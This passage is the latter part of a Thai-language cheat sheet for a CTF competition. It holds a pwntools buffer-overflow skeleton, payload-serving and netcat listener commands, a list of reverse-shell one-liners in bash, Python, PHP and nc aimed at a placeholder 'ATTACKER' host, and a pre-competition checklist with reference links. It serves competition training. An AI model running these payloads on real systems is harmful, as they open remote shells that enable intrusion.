        # เดา: น่าจะเป็น base64 ตราบใดที่ pattern ตรง
        if not re.fullmatch(rb'[A-Za-z0-9+/=]+', data.encode() if isinstance(data,str) else data):
            break
        decoded = base64.b64decode(data)
        print(decoded)
        data = decoded
    except Exception:
        break
```

### 8.6 Pwntools Skeleton

```python
from pwn import *

exe = './vuln'
elf = context.binary = ELF(exe)
context.log_level = 'info'

LOCAL = True
if LOCAL:
    p = process(exe)
else:
    p = remote('chal.ctf.com', 1337)

# === Exploit goes here ===
offset = 72
payload = b'A' * offset
payload += p64(elf.symbols['win'])

p.sendlineafter(b'> ', payload)
p.interactive()
```

### 8.7 Simple Web Server (เสิร์ฟ payload)

```bash
# Python built-in
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Node
npx http-server -p 8000
```

### 8.8 Reverse Shell Listener

```bash
# Listener
nc -lvnp 4444

# rlwrap ให้ใช้ลูกศรขึ้น-ลงได้
rlwrap nc -lvnp 4444

# Upgrade เป็น TTY (หลัง get shell แล้ว)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 8.9 Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# nc (ถ้ามี -e)
nc -e /bin/sh ATTACKER 4444

# nc (ไม่มี -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
```

---

## ✅ 9. Pre-Game Checklist

### คืนก่อนแข่ง
- [ ] อัปเดต Kali Linux และ tools ทั้งหมด
- [ ] Clone repo cheat sheet นี้ใส่เครื่อง (offline ก็ใช้ได้)
- [ ] ทดสอบเปิด Burp Suite, Wireshark, Ghidra ว่ายังเปิดได้
- [ ] เตรียม wordlist: `rockyou.txt`, `SecLists`, `dirb/big.txt`
- [ ] เซ็ต VM snapshot — โจทย์ Forensics บางทีเลอะระบบ
- [ ] ชาร์จโน้ตบุ๊ก / เตรียม power bank / สาย LAN

### เช้าวันแข่ง
- [ ] เปิด CyberChef tab ค้าง
- [ ] เปิด dCode.fr tab ค้าง
- [ ] เปิด HackTricks tab ค้าง
- [ ] เปิด PayloadsAllTheThings tab ค้าง
- [ ] เปิด Burp Suite ทิ้งไว้ในโหมด project ใหม่
- [ ] เตรียม Notepad/Obsidian จด IP/credential/flag

### ระหว่างแข่ง
- [ ] **อ่านโจทย์ให้ครบทุกข้อ** ใน 15 นาทีแรก
- [ ] **บันทึก flag ทุกครั้ง** ใน text file (กันลืม)
- [ ] **Screenshot** ทุก milestone
- [ ] **Submit flag เร็ว** อย่ารอจนนาทีสุดท้าย
- [ ] **คุยกับทีม** — แบ่งโจทย์, อย่าทำซ้ำ
- [ ] **พักทุก 90 นาที** — 5-10 นาที ดื่มน้ำ ล้างหน้า

### ⚡ Trick ลัดในสนาม

1. **`grep -r "CTF{" .`** หลังแกะไฟล์ทุกอัน — flag โผล่ฟรี
2. **CyberChef "Magic"** ก่อนทุก decode — มันเดาให้
3. **เห็น base64** → ลอง decode ก่อน ก่อนคิดอะไรซับซ้อน
4. **เห็น hash 32 ตัว** → CrackStation/Google ก่อน hashcat
5. **เว็บโจทย์ใหม่** → `/robots.txt` + view-source ทุกครั้ง
6. **Binary โจทย์ใหม่** → `strings | grep -i flag` ก่อน Ghidra
7. **Image โจทย์ใหม่** → `exiftool` + `binwalk` + `zsteg` ก่อนอย่างอื่น
8. **PCAP โจทย์ใหม่** → `File → Export Objects → HTTP` ก่อน

---

## 📚 Reference & Write-ups เพื่ออ่านเพิ่ม

- **CTFTime Write-ups**: https://ctftime.org/writeups
- **picoCTF Past Challenges**: https://play.picoctf.org/practice
- **HackTheBox CTF Tracks**: https://app.hackthebox.com/tracks
- **John Hammond YouTube**: https://www.youtube.com/@_JohnHammond (CTF walkthroughs)
- **LiveOverflow** (Pwn/Rev): https://www.youtube.com/@LiveOverflow
- **CryptoHack**: https://cryptohack.org/ (เรียน crypto จริงจัง)

### Repo ที่ควร bookmark

- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/Hack-with-Github/Awesome-Hacking
- https://github.com/zardus/ctf-tools
- https://github.com/apsdehal/awesome-ctf

---

## 🏁 ปิดท้าย

> "ใน CTF ไม่มีโจทย์ที่แก้ไม่ได้ มีแต่เวลาที่ไม่พอ"
> โฟกัสที่ "เก็บคะแนนให้ได้มากที่สุดต่อหน่วยเวลา"

**สูตรชนะ:**
1. หยิบของง่ายก่อน (low-hanging fruit)
2. คุยกับทีม แบ่งโจทย์
3. อย่าจมโจทย์เดียว
4. Document ทุก step (เผื่อกลับมา)
5. Submit ทันทีเมื่อได้ flag

**Good luck! 🚩 — เจอกันที่ scoreboard อันดับ 1**

---

*Last updated: 15 พ.ค. 2569 — สำหรับการแข่งวันที่ 16 พ.ค. 2569*
